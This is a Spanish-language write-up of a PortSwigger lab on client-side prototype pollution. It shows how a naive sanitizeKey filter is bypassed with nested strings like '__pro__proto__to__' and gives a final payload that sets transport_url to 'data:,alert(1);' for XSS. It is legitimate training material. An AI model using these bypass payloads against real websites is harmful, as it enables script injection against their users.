---
description: >-
  https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization
---

# Lab 4: Client-side prototype pollution via flawed sanitization

Al probar diferentes cargas, se detecta que no funcionan:

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Tampoco esta:

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Y tampoco esta:

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Las cargas utilizadas fueron:

```
/?__proto__[foo]=bar
/?constructor.prototype.foo=bar
/?__proto__.foo=bar
```

Se procede a revisar el codigo fuente y se detecta la siguiente funcion que probablemente esta filtrando las entradas maliciosas:

```javascript
function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}
```

La función `sanitizeKey` está diseñada para eliminar ciertas cadenas específicas de una clave. Sin embargo, no aborda adecuadamente las variaciones o fragmentaciones de estas cadenas. Vamos a analizar por qué:

La función `sanitizeKey` depende de coincidencias exactas para reemplazar. Cuando la cadena `__proto__` está incrustada dentro de otra cadena (como en el siguiente payload), la función no la reconoce como un mal atributo y no la elimina.

```
/?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar
```

Las cargas anteriores son funcionales.

Ahora si analizamos el codigo fuente:

```javascript
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}
```

Se detecta que la inyeccion o el payload debe abordar a transport\_url.

Por lo anterior, la carga quedaria de la siguiente manera:

```
/?__pro__proto__to__[transport_url]=foo
```

Pero al utilizarla obtenemos un error:\


<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Y al analizar el codigo fuente se puede apreciar la inclusion de foo:

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

La carga final para desplegar un XSS seria la siguiente:

```
/?__pro__proto__to__[transport_url]=data:,alert(1);
```

Y la salida de lo anterior es lo siguiente:

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
